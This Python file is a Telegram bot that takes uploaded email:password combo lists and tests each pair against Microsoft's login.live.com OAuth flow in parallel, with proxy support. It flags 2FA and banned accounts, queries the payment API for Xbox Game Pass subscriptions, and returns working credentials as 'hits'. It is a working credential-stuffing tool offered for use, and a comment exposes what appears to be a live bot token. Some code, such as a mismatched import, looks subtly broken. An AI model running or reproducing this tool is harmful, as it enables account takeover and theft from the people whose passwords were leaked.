import re
import uuid
import time
import os
import json
import requests
from datetime import datetime
from pathlib import Path
from urllib.parse import quote, unquote
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot
from telebot.types import FSInputFile

# ─── Bot Configuration ───────────────────────────────────────────
TOKEN = "YOUR_BOT_TOKEN_HERE"  # 8896382526:AAEySaJWfg6pQpoRuSu8zQaG50uJ_Jf0obg
BOT_NAME = "r1ivk"             # اسم البوت لتوليد الملفات بالنمط المطلوب
bot = telebot.TeleBot(TOKEN)

# ─── Proxy Manager ───────────────────────────────────────────────
class ProxyManager:
    def __init__(self, proxy_file=None, proxy_str=None):
        self.proxies = []
        self.lock = Lock()
        self.idx = 0

        if proxy_str:
            self.proxies.append(self._parse_line(proxy_str))
        if proxy_file and os.path.isfile(proxy_file):
            with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    p = self._parse_line(line.strip())
                    if p:
                        self.proxies.append(p)

    def _parse_line(self, line):
        if not line or line.startswith('#'):
            return None
        parts = line.split(':')
        if len(parts) == 2:
            return {"http": f"http://{parts[0]}:{parts[1]}", "https": f"http://{parts[0]}:{parts[1]}"}
        elif len(parts) == 4:
            user, pwd = parts[2], parts[3]
            auth = f"{user}:{pwd}@{parts[0]}:{parts[1]}"
            return {"http": f"http://{auth}", "https": f"http://{auth}"}
        return None

    def has_proxies(self):
        return len(self.proxies) > 0

    def get_random_proxy(self):
        if not self.proxies:
            return None
        with self.lock:
            p = self.proxies[self.idx % len(self.proxies)]
            self.idx += 1
            return p


# ─── Xbox Checker (Exact Logic) ──────────────────────────────────
class XboxChecker:
    def __init__(self, proxy_manager=None):
        self.proxy_manager = proxy_manager

    def get_session(self):
        session = requests.Session()
        if self.proxy_manager and self.proxy_manager.has_proxies():
            proxy = self.proxy_manager.get_random_proxy()
            if proxy:
                session.proxies.update(proxy)
        return session

    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "EXPIRED"
            date_str = date_str.replace('Z', '+00:00')
            try:
                renewal_date = datetime.fromisoformat(date_str)
            except:
                try:
                    renewal_date = datetime.strptime(date_str, "%Y-%m-%dT%H:%M:%S%z")
                except:
                    try:
                        renewal_date = datetime.strptime(date_str.split('+')[0].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        renewal_date = renewal_date.replace(tzinfo=datetime.now().astimezone().tzinfo)
                    except:
                        return "UNKNOWN"
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            if remaining < 0:
                return "EXPIRED"
            return str(remaining)
        except Exception:
            return "UNKNOWN"

    def check(self, email, password):
        try:
            session = self.get_session()
            correlation_id = str(uuid.uuid4())
            time.sleep(0.5)

            # Step 1 — HRD check
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            }
            r1 = session.get(url1, headers=headers1, timeout=15)
            if "MSAccount" not in r1.text:
                return {"status": "BAD"}

            # Step 2 — OAuth authorize
            url2 = ("https://login.live.com/oauth20_authorize.srf?"
                    "client_id=0000000048170EF2"
                    "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                    "&response_type=code"
                    "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
                    "&display=touch&username=" + email)
            r2 = session.get(url2, allow_redirects=True, timeout=15)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            # Step 3 — Login POST
            login_data = ("i13=1&login=" + email + "&loginfmt=" + email +
                          "&type=11&LoginOptions=1&passwd=" + password +
                          "&PPFT=" + ppft + "&PPSX=PassportR&NewUser=1")
            headers3 = {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://login.live.com", "Referer": r2.url}
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)

            if "account or password is incorrect" in r3.text:
                return {"status": "BAD"}
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FA"}
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BANNED"}

            location = r3.headers.get("Location", "")
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}
            code = code_match.group(1)

            # Step 4 — Token exchange
            token_data = ("client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&grant_type=authorization_code&code=" + code + "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL")
            r4 = session.post("https://login.live.com/oauth20_token.srf", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            if "access_token" not in r4.text:
                return {"status": "BAD"}

            # Step 6 — Silent delegate auth (payment token)
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = ("https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none")
            r6 = session.get(payment_auth_url, allow_redirects=True, timeout=20)

            payment_token = None
            search_text = r6.text + " " + r6.url
            for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break

            payment_data = {}
            if not payment_token:
                return {"status": "FREE", "data": payment_data}

            payment_headers = {
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com"
            }

            # Step 8 — Subscriptions
            try:
                sub_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/subscriptions"
                r8 = session.get(sub_url, headers=payment_headers, timeout=15)
                if r8.status_code == 200:
                    all_text = r8.text
                    if "Game Pass" in all_text or "Ultimate" in all_text or "Gold" in all_text or "EA Play" in all_text:
                        all_dates = re.findall(r'"(?:nextRenewalDate|expirationDate|validTo)"\s*:\s*"([^"]+)"', all_text)
                        best_days = 0
                        best_date = "N/A"
                        for date_str in all_dates:
                            days = self.get_remaining_days(date_str)
                            if days.isdigit() and int(days) > best_days:
                                best_days = int(days)
                                best_date = date_str
                        
                        sub_data = {
                            'premium_type': 'Xbox Game Pass Ultimate',
                            'renewal_date': best_date,
                            'days_remaining': str(best_days)
                        }
                        return {"status": "PREMIUM", "data": {**payment_data, **sub_data}}
            except:
                pass

            return {"status": "FREE", "data": payment_data}
        except:
            return {"status": "ERROR"}


# ─── Telegram Bot Handlers ───────────────────────────────────────
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, f"⚡ **{BOT_NAME} Checker Bot**\nWelcome! Send your Combo file (.txt) to start checking accounts.")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        combo_path = f"temp_{message.chat.id}.txt"
        with open(combo_path, 'wb') as f:
            f.write(downloaded_file)

        bot.reply_to(message, f"📥 **File received. Starting check via {BOT_NAME} Checker...**")

        combos = []
        with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        combos.append((parts[0].strip(), parts[1].strip()))

        os.remove(combo_path)

        if not combos:
            bot.reply_to(message, "❌ The file is empty or improperly formatted (must be email:password).")
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        hit_filename = f"{BOT_NAME}_GamePassHits_{timestamp}.txt"
        
        checked = 0
        total_hits = 0
        twofa_count = 0
        bad_count = 0
        
        checker = XboxChecker()
        lock = Lock()

        def worker(email, pwd):
            nonlocal checked, total_hits, twofa_count, bad_count
            res = checker.check(email, pwd)
            status = res.get("status")
            
            with lock:
                checked += 1
                if status == "PREMIUM":
                    total_hits += 1
                    data = res.get('data', {})
                    with open(hit_filename, "a", encoding="utf-8") as hf:
                        hf.write(f"{email}:{pwd} | Type: {data.get('premium_type')} | Days: {data.get('days_remaining')}\n")
                elif status == "2FA":
                    twofa_count += 1
                else:
                    bad_count += 1

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(worker, email, pwd) for email, pwd in combos]
            for future in as_completed(futures):
                pass

        summary_text = (
            f"⚡ **{BOT_NAME} Checker — SCAN COMPLETED!**\n\n"
            f"📊 Total Checked: {checked}\n"
            f"🎯 Total Hits (Premium): {total_hits}\n"
            f"🔒 2FA Protected: {twofa_count}\n"
            f"❌ Bad Accounts: {bad_count}"
        )
        bot.send_message(message.chat.id, summary_text, parse_mode="Markdown")

        if total_hits > 0 and os.path.exists(hit_filename):
            with open(hit_filename, 'rb') as hf:
                bot.send_document(
                    message.chat.id, 
                    hf, 
                    caption=f"📁 **Hits Results File:**\n`{hit_filename}`", 
                    parse_mode="Markdown"
                )
            os.remove(hit_filename)
        else:
            bot.send_message(message.chat.id, "⚠️ No active subscriptions/hits were found in this file.")

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

if __name__ == "__main__":
    print(f"[*] Bot {BOT_NAME} Checker is running...")
    bot.infinity_polling()
